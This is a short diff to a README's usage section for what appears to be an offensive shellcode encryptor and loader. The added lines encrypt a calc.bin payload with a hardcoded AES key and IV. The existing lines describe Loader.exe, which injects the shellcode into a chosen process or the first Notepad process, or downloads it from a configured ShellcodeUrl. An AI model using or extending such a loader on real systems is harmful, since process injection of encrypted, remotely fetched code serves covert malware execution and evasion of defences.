@@ -23,6 +23,11 @@
 # Usage:
 
 ```bash
+.\encryptor.exe .\calc.bin shellcode.enc --key-hex 0835E04609BDF51A3D385344F541E3505432CBECC0A94395DFB341E45BE5B224 --iv-hex EFF35696B85A572B1074CEA2963D4395 --cs-out calc.cs
+
+```
+
+```bash
 Loader.exe [--pid <processId>] [--file <path-to-enc-file>]
 (no --pid  -> injects into the first "notepad" process)
 (no --file -> downloads from ShellcodeUrl)
